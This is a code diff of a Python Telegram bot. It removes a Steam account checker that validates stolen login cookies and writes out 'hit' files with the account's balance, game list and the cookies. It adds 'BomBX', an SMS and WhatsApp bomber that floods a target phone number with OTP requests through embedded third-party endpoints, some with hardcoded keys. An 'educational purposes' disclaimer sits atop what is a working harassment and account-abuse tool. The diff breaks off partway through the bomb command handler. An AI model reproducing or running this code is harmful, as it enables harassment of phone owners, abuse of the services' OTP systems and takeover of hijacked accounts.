@@ -1,603 +1,436 @@
-import os
-import sys
-import json
-import re
-import time
-import random
-import struct
-import base64
-import urllib.parse as baro_enc
-import zipfile
-import tempfile
-import shutil
-import asyncio
-from datetime import datetime
-from concurrent.futures import ThreadPoolExecutor, as_completed
-from threading import Thread, Lock
-from io import BytesIO
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 
+# Coded By Shivam Raj (@BetterCallShiv) & Adapted for Telegram Bot
+# Disclaimer: This tool is for educational purposes only.
+# Use it responsibly and only on phone numbers you own or have explicit permission to test.
+# The developer is not responsible for any misuse of this tool.
+
+import json
+import time
 import requests
+import os
+import copy
+import signal
+import sys
+import random
+import string
+import threading
+import logging
+from datetime import datetime
 from flask import Flask, jsonify
 from telegram import Update
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+from telegram.ext import Application, CommandHandler, ContextTypes
+import urllib3
 
-# ------------------------------------------------------------
-# Original SteamChecker code (modified for reliable validation)
-# ------------------------------------------------------------
+# -------------------- Disable SSL warnings --------------------
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-G = "\033[92m"
-R = "\033[91m"
-Y = "\033[93m"
-B = "\033[94m"
-M = "\033[95m"
-C = "\033[96m"
-D = "\033[90m"
-W = "\033[97m"
-X = "\033[0m"
-
-BRN_MAP = {
-    "ES": "Spain", "US": "United States", "GB": "United Kingdom", "DE": "Germany",
-    "FR": "France", "IT": "Italy", "RU": "Russia", "CN": "China", "JP": "Japan",
-    "BR": "Brazil", "IN": "India", "CA": "Canada", "AU": "Australia", "MX": "Mexico",
-    "KR": "South Korea", "NL": "Netherlands", "SE": "Sweden", "NO": "Norway",
-    "DK": "Denmark", "FI": "Finland", "PL": "Poland", "TR": "Turkey", "UA": "Ukraine",
-    "PH": "Philippines", "TH": "Thailand", "VN": "Vietnam", "MY": "Malaysia",
-    "SG": "Singapore", "ID": "Indonesia", "SA": "Saudi Arabia", "AE": "UAE",
-}
-
-CURRENCY_MAP = {
-    "US": "$", "GB": "£", "EU": "€", "JP": "¥", "KR": "₩", "RU": "₽", "TR": "₺",
-    "PH": "₱", "NG": "₦", "GH": "₵", "CR": "₡", "UA": "₴", "IL": "₪", "GE": "₾",
-    "KZ": "₸", "MN": "₮", "KH": "៛", "BD": "৳", "SA": "﷼", "AE": "د.إ", "KW": "د.ك",
-    "BR": "R$", "AU": "A$", "CA": "C$", "SG": "S$", "HK": "HK$", "NZ": "NZ$",
-    "TW": "NT$", "MY": "RM", "ID": "Rp", "PL": "zł", "CZ": "Kč", "HU": "Ft",
-    "IN": "₹", "PK": "₨", "EG": "£", "ZA": "R", "CL": "$", "CO": "$", "MX": "$"
-}
-
-def brn_vi(v):
-    if v < 0:
-        v &= 0xffffffffffffffff
-    buf = bytearray()
-    while v > 0x7f:
-        buf.append(0x80 | (v & 0x7f))
-        v >>= 7
-    buf.append(v & 0x7f)
-    return bytes(buf)
-
-def brn_rvi(b, p):
-    r = s = 0
-    while p < len(b):
-        x = b[p]
-        p += 1
-        r |= (x & 0x7f) << s
-        if not (x & 0x80):
-            break
-        s += 7
-    return r, p
-
-def baro_ps(fn, s):
-    d = s.encode() if isinstance(s, str) else s
-    return brn_vi((fn << 3) | 2) + brn_vi(len(d)) + d
-
-def baro_pr(fn, d):
-    return brn_vi((fn << 3) | 2) + brn_vi(len(d)) + d
-
-def baro_pi(fn, v):
-    return brn_vi(fn << 3) + brn_vi(v if v >= 0 else v & 0xffffffffffffffff)
-
-def baron_pd(raw):
-    out = {}
-    p = 0
-    while p < len(raw):
-        try:
-            tag, p = brn_rvi(raw, p)
-        except:
-            break
-        fn = tag >> 3
-        wt = tag & 7
-        if fn < 1:
-            break
-        if wt == 0:
-            val, p = brn_rvi(raw, p)
-            prev = out.get(fn)
-            if prev is not None:
-                out[fn] = [prev, val] if not isinstance(prev, list) else prev + [val]
-            else:
-                out[fn] = val
-        elif wt == 2:
-            ln, p = brn_rvi(raw, p)
-            if p + ln > len(raw):
-                break
-            chunk = raw[p:p + ln]
-            p += ln
-            prev = out.get(fn)
-            if prev is not None:
-                out[fn] = [prev, chunk] if not isinstance(prev, list) else prev + [chunk]
-            else:
-                out[fn] = chunk
-        elif wt == 5:
-            if p + 4 > len(raw):
-                break
-            out[fn] = struct.unpack_from('<I', raw, p)[0]
-            p += 4
-        elif wt == 1:
-            if p + 8 > len(raw):
-                break
-            out[fn] = struct.unpack_from('<Q', raw, p)[0]
-            p += 8
-        else:
-            break
-    return out
-
-BRN_BNDRY = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
-BARON_CT = f"multipart/form-data; boundary={BRN_BNDRY}"
-
-def brn_mp(k, v):
-    return (
-        f"------WebKitFormBoundary7MA4YWxkTrZu0gW\r\n"
-        f"Content-Disposition: form-data; name=\"{k}\"\r\n\r\n"
-        f"{v}\r\n"
-        f"------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n"
-    ).encode()
-
-def format_cookies_netscape(cookies):
-    lines = ["# Netscape HTTP Cookie File"]
-    for cookie in cookies:
-        domain = cookie.get('domain', '')
-        secure = 'TRUE' if cookie.get('secure', False) else 'FALSE'
-        path = cookie.get('path', '/')
-        name = cookie.get('name', '')
-        value = cookie.get('value', '')
-        expiry = cookie.get('expires', '0')
-        lines.append(f"{domain}\t{secure}\t{path}\t{secure}\t{expiry}\t{name}\t{value}")
-    return "\n".join(lines)
-
-def format_cookies_json(cookies):
-    return json.dumps(cookies, indent=2)
-
-# ========== ENHANCED COOKIE LOADER ==========
-def load_cookies(filepath):
-    try:
-        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
-            content = f.read().strip()
-    except:
-        return None
-
-    # Try JSON
-    try:
-        data = json.loads(content)
-        if isinstance(data, list):
-            cookies = []
-            for cookie in data:
-                if 'domain' in cookie and 'name' in cookie and 'value' in cookie:
-                    domain = cookie.get('domain', '')
-                    if domain.startswith('.'):
-                        domain = domain[1:]
-                    cookies.append({
-                        'domain': domain,
-                        'name': cookie.get('name', ''),
-                        'value': cookie.get('value', ''),
-                        'path': cookie.get('path', '/'),
-                        'secure': cookie.get('secure', False),
-                        'httpOnly': cookie.get('httpOnly', False),
-                        'expires': cookie.get('expires', 0)
-                    })
-            if cookies:
-                return cookies
-        elif isinstance(data, dict):
-            for key in ['cookies', 'cookie', 'data', 'cookies_list']:
-                if key in data and isinstance(data[key], list):
-                    cookies = []
-                    for cookie in data[key]:
-                        if 'domain' in cookie and 'name' in cookie and 'value' in cookie:
-                            domain = cookie.get('domain', '')
-                            if domain.startswith('.'):
-                                domain = domain[1:]
-                            cookies.append({
-                                'domain': domain,
-                                'name': cookie.get('name', ''),
-                                'value': cookie.get('value', ''),
-                                'path': cookie.get('path', '/'),
-                                'secure': cookie.get('secure', False),
-                                'httpOnly': cookie.get('httpOnly', False),
-                                'expires': cookie.get('expires', 0)
-                            })
-                    if cookies:
-                        return cookies
-    except:
-        pass
-
-    # Try Netscape-style lines
-    lines = content.splitlines()
-    cookie_lines = []
-    for line in lines:
-        line = line.strip()
-        if not line or line.startswith('#'):
-            continue
-        parts = line.split('\t')
-        if len(parts) >= 7:
-            domain = parts[0]
-            if '.' in domain or domain == 'localhost':
-                cookie_lines.append(line)
-        elif 'steamLoginSecure' in line or 'steamRefresh_steam' in line:
-            parts = line.split('\t')
-            if len(parts) >= 7:
-                cookie_lines.append(line)
-
-    if cookie_lines:
-        cookies = []
-        for line in cookie_lines:
-            parts = line.split('\t')
-            if len(parts) >= 7:
-                domain, flag, path, secure, expires, name, value = parts[:7]
-                secure_bool = (secure.lower() == 'true')
-                cookies.append({
-                    'domain': domain,
-                    'name': name,
-                    'value': value,
-                    'path': path,
-                    'secure': secure_bool,
-                    'expires': expires,
-                    'httpOnly': False
-                })
-        if cookies:
-            return cookies
-    return None
-
-# ------------------------------------------------------------
-# SteamChecker class with advanced API calls (auto‑encoded token)
-# ------------------------------------------------------------
-class SteamChecker:
-    def __init__(self, cookie_data, cookie_file_path, index):
-        self.cookie_data = cookie_data
-        self.cookie_file_path = cookie_file_path
-        self.index = index
-        self.session = requests.Session()
-        self.steamid = ""
-        self.username = ""
-        self.token = ""
-        self.level = ""
-        self.country = ""
-        self.balance_raw = ""
-        self.balance_float = 0.0
-        self.currency = ""
-        self.total_games = 0
-        self.games = []
-        self.success = False
-
-    def extract_steamid(self):
-        for cookie in self.cookie_data:
-            if cookie.get('name') == 'steamLoginSecure':
-                value = cookie.get('value', '')
-                if '%7C%7C' in value:
-                    steamid = value.split('%7C%7C')[0]
-                    if steamid.isdigit():
-                        return steamid
-            elif cookie.get('name') == 'steamRefresh_steam':
-                value = cookie.get('value', '')
-                if '%7C%7C' in value:
-                    steamid = value.split('%7C%7C')[0]
-                    if steamid.isdigit():
-                        return steamid
-        return None
-
-    def extract_token(self):
-        for cookie in self.cookie_data:
-            if cookie.get('name') == 'steamLoginSecure':
-                value = cookie.get('value', '')
-                if '%7C%7C' in value:
-                    parts = value.split('%7C%7C')
-                    if len(parts) >= 2:
-                        # Unquote like original SteamCookie.py
-                        return baro_enc.unquote(parts[1])
-        return None
-
-    def get_username_from_profile(self, sid_int):
-        try:
-            resp = self.session.get(
-                f"https://steamcommunity.com/profiles/{sid_int}",
-                timeout=10,
-                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
-            )
-            if resp.status_code == 200:
-                title_match = re.search(r'<title>(.*?)</title>', resp.text)
-                if title_match:
-                    title = title_match.group(1)
-                    if 'Steam Community :: ' in title:
-                        return title.replace('Steam Community :: ', '').strip()
-                    if 'Steam 社区 :: ' in title:
-                        return title.replace('Steam 社区 :: ', '').strip()
-                    return title.strip()
-        except:
-            pass
-        return None
-
-    def get_level(self, sid_int):
-        try:
-            mpid = sid_int - 76561197960265728
-            resp = self.session.get(
-                f"https://steamcommunity.com/miniprofile/{mpid}/json",
-                timeout=10,
-                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
-            )
-            if resp.status_code == 200:
-                data = resp.json()
-                level = data.get("level", data.get("player_level", ""))
-                if level:
-                    return str(level)
-        except:
-            pass
-        try:
-            resp = self.session.get(
-                f"https://steamcommunity.com/profiles/{sid_int}",
-                timeout=10,
-                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
-            )
-            if resp.status_code == 200:
-                level_match = re.search(r'level\s*(\d+)', resp.text, re.I)
-                if level_match:
-                    return level_match.group(1)
-                level_match = re.search(r'<span[^>]*class="[^"]*player_level[^"]*"[^>]*>(\d+)</span>', resp.text, re.I)
-                if level_match:
-                    return level_match.group(1)
-        except:
-            pass
-        return "?"
-
-    # Helper for retries
-    def _api_request(self, method, url, **kwargs):
-        """Make an API request with automatic token encoding and retries."""
-        # Always add token as query parameter (automatically encoded by requests)
-        params = kwargs.pop('params', {})
-        params['access_token'] = self.token
-        kwargs['params'] = params
-
-        retries = 3
-        delay = 1
-        for attempt in range(retries):
-            try:
-                resp = self.session.request(method, url, timeout=10, **kwargs)
-                if resp.status_code in (200, 204):
-                    return resp
-                # If we get a 401/403, no point retrying
-                if resp.status_code in (401, 403):
-                    break
-                time.sleep(delay)
-                delay *= 2
-            except requests.exceptions.RequestException:
-                if attempt == retries - 1:
-                    raise
-                time.sleep(delay)
-                delay *= 2
-        return resp
-
-    def check(self):
-        self.steamid = self.extract_steamid()
-        self.token = self.extract_token()
-        if not self.steamid or not self.token:
-            return False
-
-        self.session.cookies.set('Steam_Language', 'english')
-        sid_int = int(self.steamid)
-
-        # ---- Step 1: Profile page (most reliable) ----
-        profile_ok = False
-        try:
-            resp = self.session.get(
-                f"https://steamcommunity.com/profiles/{sid_int}",
-                timeout=10,
-                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
-            )
-            if resp.status_code == 200:
-                profile_ok = True
-                # Extract username and level from profile
-                title_match = re.search(r'<title>(.*?)</title>', resp.text)
-                if title_match:
-                    title = title_match.group(1)
-                    if 'Steam Community :: ' in title:
-                        self.username = title.replace('Steam Community :: ', '').strip()
-                    elif 'Steam 社区 :: ' in title:
-                        self.username = title.replace('Steam 社区 :: ', '').strip()
-                    else:
-                        self.username = title.strip()
-                level_match = re.search(r'level\s*(\d+)', resp.text, re.I)
-                if level_match:
-                    self.level = level_match.group(1)
-                else:
-                    # fallback to miniprofile API
-                    try:
-                        mpid = sid_int - 76561197960265728
-                        resp2 = self.session.get(
-                            f"https://steamcommunity.com/miniprofile/{mpid}/json",
-                            timeout=10,
-                            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
-                        )
-                        if resp2.status_code == 200:
-                            data = resp2.json()
-                            level = data.get("level", data.get("player_level", ""))
-                            if level:
-                                self.level = str(level)
-                    except:
-                        pass
-        except:
-            pass
-
-        # If profile page failed, we still try APIs, but we need to set username/level later.
-        # We'll consider the account valid if ANY API succeeds.
-        any_api_success = False
-
-        # ---- Helper to fetch data from APIs ----
-        try:
-            # 1. Country
-            cpb = struct.pack('<BQ', 0x09, sid_int)
-            data_enc = base64.b64encode(cpb).decode()
-            resp = self._api_request(
-                'POST',
-                "https://api.steampowered.com/IUserAccountService/GetUserCountry/v1",
-                data=brn_mp("input_protobuf_encoded", data_enc),
-                headers={"Content-Type": BARON_CT}
-            )
-            if resp and resp.status_code == 200:
-                data = baron_pd(resp.content)
-                cc = data.get(1, b"")
-                if cc:
-                    if isinstance(cc, bytes):
-                        cc = cc.decode()
-                    self.country = BRN_MAP.get(cc, cc)
-                    any_api_success = True
-
-            # 2. Games list
-            gpb = (baro_pi(1, sid_int) + baro_pi(2, 1) + baro_pi(3, 1) +
-                   baro_pi(6, 0) + baro_ps(7, "english") + baro_pi(8, 1) +
-                   baro_pi(9, 1) + baro_pi(10, 1))
-            gb64 = baro_enc.quote(base64.b64encode(gpb).decode())
-            resp = self._api_request(
-                'GET',
-                "https://api.steampowered.com/IPlayerService/GetOwnedGames/v1",
-                params={"input_protobuf_encoded": gb64}
-            )
-            if resp and resp.status_code == 200:
-                data = baron_pd(resp.content)
-                self.total_games = data.get(1, 0)
-                any_api_success = True
-                raw_games = data.get(2, [])
-                if isinstance(raw_games, bytes):
-                    raw_games = [raw_games]
-                elif not isinstance(raw_games, list):
-                    raw_games = []
-                for g in raw_games:
-                    try:
-                        if not isinstance(g, bytes):
-                            continue
-                        gf = baron_pd(g)
-                        name = gf.get(2, b"")
-                        if isinstance(name, bytes):
-                            name = name.decode(errors="replace")
-                        if isinstance(name, str) and name.strip():
-                            self.games.append(name.strip())
-                    except:
-                        continue
-
-            # 3. Balance
-            resp = self._api_request(
-                'POST',
-                "https://api.steampowered.com/IUserAccountService/GetClientWalletDetails/v1",
-                data=brn_mp("input_protobuf_encoded", "GAE="),
-                headers={"Content-Type": BARON_CT}
-            )
-            if resp and resp.status_code == 200:
-                data = baron_pd(resp.content)
-                bal = data.get(14, b"")
-                if isinstance(bal, bytes):
-                    bal = bal.decode("utf-8", errors="ignore")
-                elif isinstance(bal, int):
-                    bal = str(bal)
-                self.balance_raw = bal
-                any_api_success = True
-                # parse balance
-                def parse_balance(balance_str, country_code):
-                    currency_symbols = ['$', '€', '£', '¥', '₩', '₽', '₺', '₱', '₦', '₵', '₡', '₴', '₪', '₾', '₸', '₮', '៛', '৳', '﷼', 'د.إ', 'د.ك', 'R$', 'A$', 'C$', 'S$', 'HK$', 'NZ$', 'NT$', 'RM', 'Rp', 'zł', 'Kč', 'Ft', '₨']
-                    symbol = ''
-                    for sym in currency_symbols:
-                        if sym in balance_str:
-                            symbol = sym
-                            break
-                    if not symbol and country_code in CURRENCY_MAP:
-                        symbol = CURRENCY_MAP[country_code]
-                    cleaned = re.sub(r'[^\d.,\-]', '', balance_str)
-                    if ',' in cleaned and '.' not in cleaned:
-                        cleaned = cleaned.replace(',', '.')
-                    parts = cleaned.split('.')
-                    if len(parts) > 2:
-                        cleaned = parts[0] + '.' + ''.join(parts[1:])
-                    try:
-                        value = float(cleaned)
-                    except:
-                        value = 0.0
-                    return value, symbol
-                self.balance_float, self.currency = parse_balance(bal, self.country)
-
-        except Exception as e:
-            # Log error silently; we still might have profile info
-            pass
-
-        # ---- Decide if account is valid ----
-        # If profile page loaded, we consider it valid even if APIs failed.
-        # If profile failed but at least one API succeeded, we still consider it valid.
-        if profile_ok:
-            self.success = True
-            return True
-        elif any_api_success:
-            # We have API data but no profile; try to get username/level from profile anyway
-            try:
-                if not self.username:
-                    username = self.get_username_from_profile(sid_int)
-                    if username:
-                        self.username = username
-                if not self.level or self.level == "?":
-                    self.level = self.get_level(sid_int)
-            except:
-                pass
-            if not self.username:
-                self.username = self.steamid[:8]
-            if not self.level:
-                self.level = "?"
-            self.success = True
-            return True
-        else:
-            self.success = False
-            return False
-
-def generate_hit_content(hit):
-    username = hit.username if hit.username else hit.steamid[:8]
-    country = hit.country if hit.country else "Unknown"
-    balance = hit.balance_raw if hit.balance_raw else "0"
-    if hit.currency and not any(c in balance for c in ['$','€','£','¥','₩','₽','₺','₱','₦','₵','₡','₴','₪','₾','₸','₮','៛','৳','﷼','د.إ','د.ك','R$','A$','C$','S$','HK$','NZ$','NT$','RM','Rp','zł','Kč','Ft','₨']):
-        balance = f"{hit.currency}{balance}"
-    games = str(hit.total_games) if hit.total_games else "0"
-    games_str = "\n".join([f"{i+1}. {game}" for i, game in enumerate(hit.games)]) if hit.games else "No games found"
-    netscape_cookies = format_cookies_netscape(hit.cookie_data)
-    json_cookies = format_cookies_json(hit.cookie_data)
-
-    content = f"""STEAM ACCOUNT DETAILS
-{'='*60}
-
-Steam ID    : {hit.steamid}
-Username    : {hit.username if hit.username else 'Unknown'}
-Level       : {hit.level}
-Country     : {country}
-Balance     : {balance}
-Total Games : {hit.total_games}
-
-{'='*60}
-GAMES LIST:
-{'-'*60}
-{games_str}
-
-{'='*60}
-COOKIES (Netscape Format):
-{'-'*60}
-{netscape_cookies}
-
-{'='*60}
-COOKIES (JSON Format):
-{'-'*60}
-{json_cookies}
-
-{'='*60}
-Checked on : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-"""
-    return content
-
-# ------------------------------------------------------------
-# Telegram Bot and Flask (unchanged)
-# ------------------------------------------------------------
-
-BOT_TOKEN = os.environ.get("BOT_TOKEN")
-if not BOT_TOKEN:
-    print("Error: BOT_TOKEN environment variable not set.")
+# -------------------- Configuration --------------------
+TELEGRAM_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
+if not TELEGRAM_TOKEN:
+    print("ERROR: TELEGRAM_BOT_TOKEN environment variable not set.")
     sys.exit(1)
 
+# API configuration (embedded)
+API_CONFIG = {
+    "BomBX_API": {
+        "HealthKart": {
+            "type": "sms",
+            "method": "GET",
+            "url": "https://www.healthkart.com/veronica/user/validate/1/{phone}/signup?plt=1&st=1",
+            "sleep": 20
+        },
+        "NNNOW": {
+            "type": "sms",
+            "method": "POST",
+            "url": "https://api.nnnow.com/m/mobapi/otp/generateOtp/v1/flash",
+            "data": {"mobileNumber": "{phone}"},
+            "sleep": 20
+        },
+        "Shiprocket": {
+            "type": "sms",
+            "method": "POST",
+            "url": "https://apiv2.shiprocket.in/v1/auth/login/quick",
+            "data": {"mobile": "{phone}", "device_id": "LQ3.981019.001"},
+            "sleep": 20
+        },
+        "MeeHelp": {
+            "type": "sms",
+            "method": "GET",
+            "url": "https://meehelp.co.in/api/customer/msgDispatch?phone_number={phone}&key=AjSfg9FGDuo&API_KEY=70FF52C593B828281A",
+            "headers": {
+                "user-agent": "Dart/3.9 (dart:io)",
+                "accept": "application/json",
+                "accept-encoding": "gzip",
+                "host": "meehelp.co.in"
+            },
+            "sleep": 20
+        },
+        "Nathabit_WhatsApp": {
+            "type": "whatsapp",
+            "method": "POST",
+            "url": "https://authorize.api.nathabit.in/v2/auth/v2/app/no/opt/",
+            "headers": {
+                "Content-Type": "application/json",
+                "Host": "authorize.api.nathabit.in",
+                "Connection": "Keep-Alive",
+                "Accept-Encoding": "gzip",
+                "User-Agent": "okhttp/4.9.2"
+            },
+            "cookies": {"cust_cart": "kT7wRpLmXv3hQdNs9YeJ"},
+            "data": {"phone": "{phone}", "send_on_whatsapp": True, "address_consent": True},
+            "sleep": 30
+        }
+    }
+}
+
+# -------------------- Logging setup (file rotation) --------------------
+LOG_FILE = "BomBX-Logs.txt"
+MAX_LOG_SIZE = 5 * 1024 * 1024  # 5 MB
+
+def rotate_log():
+    """Rotate log file if it exceeds MAX_LOG_SIZE."""
+    if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > MAX_LOG_SIZE:
+        with open(LOG_FILE, "r") as f:
+            lines = f.readlines()
+        # Keep last 1000 lines
+        with open(LOG_FILE, "w") as f:
+            f.writelines(lines[-1000:])
+
+# -------------------- Helper functions --------------------
+def generate_random_firstname():
+    return ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 8))).capitalize()
+
+def generate_random_lastname():
+    return ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 8))).capitalize()
+
+def generate_random_email(firstname, lastname):
+    domains = ["gmail.com", "yahoo.com", "outlook.com", "icloud.com"]
+    return f"{firstname.lower()}{lastname.lower()}{random.randint(10, 9999)}@{random.choice(domains)}"
+
+# -------------------- Bomber Class with Stats --------------------
+class Bomber:
+    def __init__(self, config_data, mode):
+        self.api_data = self.load_api(config_data, mode)
+        self.running = True
+        # Stats: per API and totals
+        self.stats = {
+            "total": {"sent": 0, "success": 0, "fail": 0},
+            "per_api": {}
+        }
+        for name in self.api_data:
+            self.stats["per_api"][name] = {"sent": 0, "success": 0, "fail": 0}
+        self.last_response = {name: None for name in self.api_data}  # only used for log dedup
+
+    def load_api(self, config_data, mode):
+        if "BomBX_API" not in config_data:
+            raise KeyError("'BomBX_API' section missing.")
+        apis = config_data["BomBX_API"]
+        if mode == "sms":
+            return {k: v for k, v in apis.items() if v.get("type") == "sms"}
+        elif mode == "call":
+            return {k: v for k, v in apis.items() if v.get("type") == "call"}
+        elif mode == "whatsapp":
+            return {k: v for k, v in apis.items() if v.get("type") == "whatsapp"}
+        elif mode == "multi":
+            return apis
+        else:
+            return apis
+
+    def build_cookies(self, api, phone, firstname, lastname, fullname, email):
+        raw_cookies = api.get("cookies", {})
+        if isinstance(raw_cookies, dict):
+            cookies = {}
+            for k, v in raw_cookies.items():
+                if isinstance(v, str):
+                    cookies[k] = v.replace("{phone}", phone).replace("{firstname}", firstname) \
+                                   .replace("{lastname}", lastname).replace("{fullname}", fullname) \
+                                   .replace("{email}", email)
+                else:
+                    cookies[k] = v
+            return cookies
+        elif isinstance(raw_cookies, str) and raw_cookies.strip():
+            cookie_str = raw_cookies.replace("{phone}", phone).replace("{firstname}", firstname) \
+                                    .replace("{lastname}", lastname).replace("{fullname}", fullname) \
+                                    .replace("{email}", email)
+            cookies = {}
+            for part in cookie_str.split(";"):
+                part = part.strip()
+                if not part or "=" not in part:
+                    continue
+                k, v = part.split("=", 1)
+                cookies[k.strip()] = v.strip()
+            return cookies
+        return {}
+
+    def send_request(self, api_name, phone):
+        api = self.api_data[api_name]
+        firstname = generate_random_firstname()
+        lastname = generate_random_lastname()
+        fullname = f"{firstname} {lastname}"
+        email = generate_random_email(firstname, lastname)
+
+        def replace_vars(s):
+            if not isinstance(s, str):
+                return s
+            return s.replace("{phone}", phone).replace("{firstname}", firstname) \
+                    .replace("{lastname}", lastname).replace("{fullname}", fullname) \
+                    .replace("{email}", email)
+
+        url = replace_vars(api["url"])
+        method = api.get("method", "GET").upper()
+
+        headers = {}
+        for k, v in api.get("headers", {}).items():
+            headers[k] = replace_vars(v)
+
+        cookies = self.build_cookies(api, phone, firstname, lastname, fullname, email)
+
+        raw_data = api.get("data", {})
+        if isinstance(raw_data, dict):
+            data = {}
+            for k, v in raw_data.items():
+                data[k] = replace_vars(v)
+        elif isinstance(raw_data, str):
+            data = replace_vars(raw_data)
+        else:
+            data = raw_data
+
+        # Update stats
+        self.stats["total"]["sent"] += 1
+        self.stats["per_api"][api_name]["sent"] += 1
+
+        try:
+            if method == "GET":
+                r = requests.get(url, headers=headers, cookies=cookies, timeout=10, verify=False)
+            else:
+                content_type = headers.get("Content-Type", "").lower()
+                if "application/json" in content_type:
+                    if isinstance(data, str):
+                        try:
+                            json_data = json.loads(data)
+                            r = requests.post(url, headers=headers, cookies=cookies, json=json_data, timeout=10, verify=False)
+                        except json.JSONDecodeError:
+                            r = requests.post(url, headers=headers, cookies=cookies, data=data, timeout=10, verify=False)
+                    else:
+                        r = requests.post(url, headers=headers, cookies=cookies, json=data, timeout=10, verify=False)
+                else:
+                    r = requests.post(url, headers=headers, cookies=cookies, data=data, timeout=10, verify=False)
+
+            success = r.status_code in range(200, 300)
+            if success:
+                self.stats["total"]["success"] += 1
+                self.stats["per_api"][api_name]["success"] += 1
+                status_str = "SUCCESS"
+            else:
+                self.stats["total"]["fail"] += 1
+                self.stats["per_api"][api_name]["fail"] += 1
+                status_str = "FAILED"
+
+            # Log to file (only if different from last response)
+            if self.last_response.get(api_name) != r.text:
+                rotate_log()
+                with open(LOG_FILE, "a", encoding="utf-8") as f:
+                    f.write(
+                        f"--- [{datetime.now().strftime('%d-%m-%Y %H:%M:%S')}] "
+                        f"[{status_str}] {api_name} -> Status: {r.status_code} ---\n"
+                        f"{r.text[:500]}{'... (truncated)' if len(r.text)>500 else ''}\n"
+                        f"--- End Response ---\n\n"
+                    )
+                self.last_response[api_name] = r.text
+
+            # Minimal console output (optional, for debugging)
+            print(f"{'[SUCCESS]' if success else '[FAILED]'} {api_name} -> {r.status_code}")
+
+        except Exception as e:
+            self.stats["total"]["fail"] += 1
+            self.stats["per_api"][api_name]["fail"] += 1
+            print(f"[ERROR] {api_name} -> {e}")
+            rotate_log()
+            with open(LOG_FILE, "a", encoding="utf-8") as f:
+                f.write(
+                    f"--- [{datetime.now().strftime('%d-%m-%Y %H:%M:%S')}] "
+                    f"[ERROR] {api_name} -> {e}\n--- End Response ---\n\n"
+                )
+
+    def start(self, phone):
+        print(f"[*] Bomber Started for {phone}")
+        last_used = {name: datetime.min for name in self.api_data}
+        while self.running:
+            now = datetime.now()
+            any_request_sent = False
+            for api_name, api in self.api_data.items():
+                if not self.running:
+                    break
+                sleep_seconds = api.get("sleep", 0)
+                if (now - last_used[api_name]).total_seconds() >= sleep_seconds:
+                    self.send_request(api_name, phone)
+                    last_used[api_name] = datetime.now()
+                    any_request_sent = True
+                    time.sleep(1)  # small gap between requests
+            if not any_request_sent:
+                time.sleep(1)
+
+    def stop(self):
+        self.running = False
+
+    def get_stats(self):
+        """Return a formatted stats string."""
+        total = self.stats["total"]
+        lines = [
+            f"📊 *Live Stats*\n",
+            f"📱 Total requests: {total['sent']}",
+            f"✅ Success: {total['success']}",
+            f"❌ Failed: {total['fail']}",
+            f"📈 Success rate: { (total['success']/total['sent']*100) if total['sent']>0 else 0:.1f}%\n",
+            "── *Per API* ──"
+        ]
+        for api, s in self.stats["per_api"].items():
+            lines.append(f"• {api}: sent={s['sent']}, ok={s['success']}, fail={s['fail']}")
+        return "\n".join(lines)
+
+# -------------------- Telegram Bot Handlers --------------------
+active_sessions = {}  # chat_id -> {"bomber": Bomber, "thread": threading.Thread, "phone": str, "mode": str}
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "🤖 *BomBX Telegram Bot*\n\n"
+        "I can send SMS, Call, or WhatsApp messages to a target number using multiple APIs.\n\n"
+        "Commands:\n"
+        "/bomb `<phone>` `[mode]` – Start bombing (mode: sms/call/whatsapp/multi, default: multi)\n"
+        "/stop – Stop bombing for your session\n"
+        "/status – Check current bombing status\n"
+        "/stats – Show live statistics for your active session\n"
+        "/help – Show this message\n\n"
+        "⚠️ *Disclaimer:* Use only for educational purposes on numbers you own or have permission to test.",
+        parse_mode="Markdown"
+    )
+
+async def bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    chat_id = update.effective_chat.id
+    args = context.args
+
+    if not args:
+        await update.message.reply_text("❌ Please provide a phone number.\nExample: `/bomb 9876543210 sms`", parse_mode="Markdown")
+        return
+
+    phone = args[0]
+    mode = "multi"
+    if len(args) > 1:
+        mode = args[1].lower()
+        if mode not in ["sms", "call", "whatsapp", "multi"]:
+            await update.message.reply_text("❌ Invalid mode. Choose from: sms, call, whatsapp, multi")
+            return
+
+    if chat_id in active_sessions:
+        await update.message.reply_text("⚠️ You already have an active bombing session. Use `/stop` to stop it first.", parse_mode="Markdown")
+        return
+
+    if not phone.isdigit() or len(phone) < 10:
+        await update.message.reply_text("❌ Invalid phone number. Please enter a valid numeric number (e.g., 9876543210).")
+        return
+
+    try:
+        bomber = Bomber(API_CONFIG, mode)
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error initializing bomber: {e}")
+        return
+
+    if not bomber.api_data:
+        await update.message.reply_text(f"❌ No APIs available for mode '{mode}'. Check configuration.")
+        return
+
+    def run_bomber():
+        bomber.start(phone)
+        # Cleanup after bomber finishes (e.g., if stopped naturally)
+        if chat_id in active_sessions:
+            del active_sessions[chat_id]
+            print(f"[INFO] Session for chat {chat_id} removed after bomber finished.")
+
+    thread = threading.Thread(target=run_bomber, daemon=True)
+    thread.start()
+
+    active_sessions[chat_id] = {
+        "bomber": bomber,
+        "thread": thread,
+        "phone": phone,
+        "mode": mode
+    }
+
+    await update.message.reply_text(
+        f"✅ *Bombing started!*\n"
+        f"📱 Target: `{phone}`\n"
+        f"📡 Mode: `{mode}`\n"
+        f"⏳ Sending requests...\n\n"
+        f"Use `/stop` to stop the bombing.\n"
